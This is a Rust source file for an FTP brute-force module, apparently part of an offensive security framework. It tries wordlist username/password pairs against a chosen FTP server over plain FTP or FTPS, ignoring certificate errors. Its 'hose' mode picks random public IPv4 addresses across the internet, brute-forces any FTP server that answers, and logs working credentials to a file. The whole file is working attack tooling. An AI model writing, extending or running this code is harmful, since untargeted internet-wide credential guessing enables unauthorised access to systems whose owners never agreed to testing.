use anyhow::{anyhow, Result, Context};
use colored::*;
use suppaftp::tokio::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    fs::File,
    io::Write,
    sync::Arc,
    time::Duration,
    net::{IpAddr, Ipv4Addr, SocketAddr},
};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use tokio::{
    sync::{Mutex, Semaphore},
    time::{sleep, timeout},
    process::Command,
    fs::OpenOptions,
    io::AsyncWriteExt,
    net::TcpStream,
};
use futures::stream::{FuturesUnordered, StreamExt};
use rand::Rng;

use crate::utils::{
    prompt_required, prompt_default, prompt_yes_no, 
    prompt_int_range, prompt_wordlist,
    load_lines, get_filename_in_current_dir
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
const STATE_FILE: &str = "ftp_brute_hose_state.log";

// Hardcoded exclusions
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", 
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", 
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", 
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    "8.8.8.8/32", "8.8.4.4/32"
];

/// FTP error classification for better handling
#[derive(Debug, Clone, Copy)]
enum FtpErrorType {
    AuthenticationFailed,
    TlsRequired,
    ConnectionLimitExceeded,
    ConnectionFailed,
    Unknown,
}

impl FtpErrorType {
    /// Classify FTP error based on response message
    fn classify_error(msg: &str) -> Self {
        let msg_lower = msg.to_lowercase();

        // Authentication failed
        if msg.contains("530") || msg_lower.contains("login incorrect") ||
           msg_lower.contains("user") && msg_lower.contains("cannot") ||
           msg_lower.contains("password") && msg_lower.contains("incorrect") {
            return Self::AuthenticationFailed;
        }

        // TLS required
        if msg.contains("550 SSL") || msg_lower.contains("tls required") ||
           msg_lower.contains("ssl connection required") ||
           msg.contains("220 TLS go first") ||
           msg_lower.contains("must use tls") {
            return Self::TlsRequired;
        }

        // Connection limit exceeded
        if msg.contains("421") || msg_lower.contains("too many") ||
           msg_lower.contains("connection limit") {
            return Self::ConnectionLimitExceeded;
        }

        // Connection failed
        if msg_lower.contains("connection refused") ||
           msg_lower.contains("no route to host") ||
           msg_lower.contains("network unreachable") ||
           msg_lower.contains("connection reset") {
            return Self::ConnectionFailed;
        }

        Self::Unknown
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   FTP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Supports IPv4/IPv6 & Mass Scanning (Hose Mode)          ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Format IPv4 or IPv6 addresses with port for display
fn format_addr_for_display(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean_target = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean_target.contains(':') {
            format!("[{}]:{}", clean_target, port)
        } else {
            format!("{}:{}", clean_target, port)
        }
    }
}


pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Check for Mass Scan Mode
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    println!("{}", format!("[*] Target: {}", target).cyan());

    // --- Standard Single Target Logic ---

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21")?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "500")?;
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    // Create a semaphore to limit concurrent network operations
    let semaphore = Arc::new(Semaphore::new(concurrency));

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false)?;

    let display_addr = format_addr_for_display(target, port);
    let connect_addr = format_addr_for_display(target, port);

    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());

    println!("\n[*] Starting brute-force on {}", display_addr);

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());

    let passes = load_lines(&passwords_file)?;
    if passes.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());

    let total_attempts = if combo_mode { users.len() * passes.len() } else { passes.len() };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();

    if combo_mode {
        for user in &users {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for pass in &passes {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = connect_addr.clone();
                let target_clone = target.to_string();
                let display_addr_clone = display_addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let unknown_clone = Arc::clone(&unknown);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &target_clone, &user_clone, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", display_addr_clone, user_clone, pass_clone).green().bold());
                            found_clone.lock().await.push((display_addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", display_addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            {
                                let mut _unknown_clone = unknown_clone.lock().await;
                                _unknown_clone.push((
                                    display_addr_clone.clone(),
                                    user_clone.clone(),
                                    pass_clone.clone(),
                                    msg.clone(),
                                ));
                            }
                            if verbose_flag {
                                println!("\r{}", format!("[?] {} -> {}:{} error/unknown: {}", display_addr_clone, user_clone, pass_clone, msg).yellow());
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    } else {
        if !users.is_empty() {
            for (i, pass) in passes.iter().enumerate() {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
                let user = users.get(i % users.len()).expect("User list modulus logic error").clone();

                let addr_clone = connect_addr.clone();
                let target_clone = target.to_string();
                let display_addr_clone = display_addr.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let unknown_clone = Arc::clone(&unknown);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &target_clone, &user, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", display_addr_clone, user, pass_clone).green().bold());
                            found_clone.lock().await.push((display_addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", display_addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            {
                                let mut unk = unknown_clone.lock().await;
                                unk.push((
                                    display_addr_clone.clone(),
                                    user.clone(),
                                    pass_clone.clone(),
                                    msg.clone(),
                                ));
                            }
                            if verbose_flag {
                                println!("\r{}", format!("[!] Error: {}", e).yellow());
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("  {}  {}:{}:{}", "✓".green(), host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            match File::create(&file_path) {
                Ok(mut file) => {
                    for (host, user, pass) in creds.iter() {
                        // Standardized format: IP:PORT:USER:PASS
                        // host should already include IP:PORT based on `display_addr` formatting earlier
                        // But wait, `display_addr` is `[IP]:Port` or `IP:Port`
                        // We want strictly `IP:PORT:USER:PASS`
                        if writeln!(file, "{}:{}:{}", host, user, pass).is_err() {
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", file_path.display());
                }
                Err(e) => {
                     eprintln!("[!] Could not create or write to result file '{}': {}", file_path.display(), e);
                }
            }
        }
    }

    Ok(())
}

async fn run_mass_scan(target: &str) -> Result<()> {
    // Prep
    let port: u16 = prompt_default("FTP Port", "21")?.parse().unwrap_or(21);
    let usernames_file = prompt_wordlist("Username wordlist")?;
    let passwords_file = prompt_wordlist("Password wordlist")?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false)?; 
    let output_file = prompt_default("Output result file", "ftp_brute_mass_results.txt")?;

    // Parse exclusions
    let mut exclusion_subnets = Vec::new();
    for cidr in EXCLUDED_RANGES {
        if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
            exclusion_subnets.push(net);
        }
    }
    let exclusions = Arc::new(exclusion_subnets);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, pass_lines));

    // Stats
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 if !is_ip_checked(&ip).await {
                     mark_ip_checked(&ip).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
        // File Mode
        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
             let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             if let Ok(ip) = ip_str.parse::<IpAddr>() {
                 tokio::spawn(async move {
                    if !is_ip_checked(&ip).await {
                        mark_ip_checked(&ip).await;
                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                 });
             } else {
                 drop(permit); 
             }
        }
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }
    
    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16,
    creds: Arc<(Vec<String>, Vec<String>)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check
    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
        return;
    }

    let (users, passes) = &*creds;

    // 2. Iterative Bruteforce
    // Sequential try to avoid blasting the server
    let addr_str = format!("{}:{}", ip, port);

    for user in users {
        for pass in passes {
            let res = try_ftp_login(&addr_str, &ip.to_string(), user, pass, verbose).await;
            match res {
                Ok(true) => {
                    // Format: IP:PORT:USER:PASS
                    let msg = format!("{}:{}:{}:{}", ip, port, user, pass);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success
                }
                Ok(false) => { // Auth failed
                }
                Err(e) => {
                     // If conn refused/timeout, likely dead or blocked, abort this host
                     let err = e.to_string().to_lowercase();
                     if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                         return; 
                     }
                }
            }
        }
    }
}

/// Try login using address string and fallback to FTPS if needed
async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
    // Attempt 1: Plain FTP
    if verbose {
        //println!("[i] Connecting to {} (plain FTP)", addr);
    }

    match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    match FtpErrorType::classify_error(&msg) {
                        FtpErrorType::AuthenticationFailed => {
                            return Ok(false);
                        }
                        FtpErrorType::TlsRequired => {
                            // Proceed to FTPS attempt
                        }
                        FtpErrorType::ConnectionLimitExceeded => {
                            sleep(Duration::from_secs(1)).await;
                            return Ok(false); // Treat as soft fail
                        }
                        _ => {
                            return Err(anyhow!("FTP login error: {}", msg));
                        }
                    }
                }
            }
        }
        Ok(Err(e)) => {
             // Connection level error
             return Err(e.into());
        }
        Err(_) => {
            return Err(anyhow!("Timeout"));
        }
    }

    // FTPS fallback logic (retained but lightweight for mass scan? maybe skip for mass scan unless configured?)
    // For now, reuse it as it makes the check robust.
    
    // FTPS attempts ... (simulated reuse of original logic below)
    let mut ftp_tls = match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncNativeTlsFtpStream::connect(addr)).await {
        Ok(Ok(s)) => s,
        _ => return Err(anyhow!("FTPS Connect failed")),
    };

    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );
    
    let domain = target.trim_start_matches('[').split(&[']', ':'][..]).next().unwrap_or(target);

    ftp_tls = match ftp_tls.into_secure(connector, domain).await {
        Ok(s) => s,
        Err(e) => return Err(anyhow!("TLS Upgrade: {}", e)),
    };

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) => {
             match FtpErrorType::classify_error(&e.to_string()) {
                FtpErrorType::AuthenticationFailed => Ok(false),
                _ => Err(anyhow!("FTPS Error: {}", e)),
             }
        }
    }
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        let mut excluded = false;
        for net in exclusions {
            if net.contains(ip_addr) {
                excluded = true;
                break;
            }
        }
        if !excluded { return ip_addr; }
    }
}

async fn is_ip_checked(ip: &impl ToString) -> bool {
    if !std::path::Path::new(STATE_FILE).exists() {
        return false;
    }
    let ip_s = ip.to_string();
    let status = Command::new("grep")
        .arg("-F")
        .arg("-q")
        .arg(format!("checked: {}", ip_s))
        .arg(STATE_FILE)
        .stderr(std::process::Stdio::null())
        .status()
        .await;
    match status { Ok(s) => s.success(), Err(_) => false }
}

async fn mark_ip_checked(ip: &impl ToString) {
    let data = format!("checked: {}\n", ip.to_string());
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(STATE_FILE).await {
        let _ = file.write_all(data.as_bytes()).await;
    }
}
